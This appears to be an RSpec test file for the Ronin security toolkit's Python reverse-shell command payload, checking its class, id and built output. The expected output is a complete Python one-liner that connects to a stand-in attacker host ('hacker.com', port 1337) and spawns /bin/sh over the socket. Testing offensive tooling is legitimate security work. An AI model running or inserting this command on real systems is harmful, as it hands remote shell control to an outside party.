require 'spec_helper'
require 'ronin/payloads/builtin/cmd/python/reverse_shell'

describe Ronin::Payloads::CMD::Python::ReverseShell do
  it "must inherit from Ronin::Payloads::CommandPayload" do
    expect(described_class).to be < Ronin::Payloads::CommandPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'cmd/python/reverse_shell'" do
      expect(subject.id).to eq('cmd/python/reverse_shell')
    end
  end

  let(:host) { 'hacker.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build an `python` command that connects back to the host and port params" do
      expect(subject.payload).to eq(
        %{python -c 'import socket,os,pty;s=socket.socket();s.connect((#{host.dump},#{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'}
      )
    end
  end
end
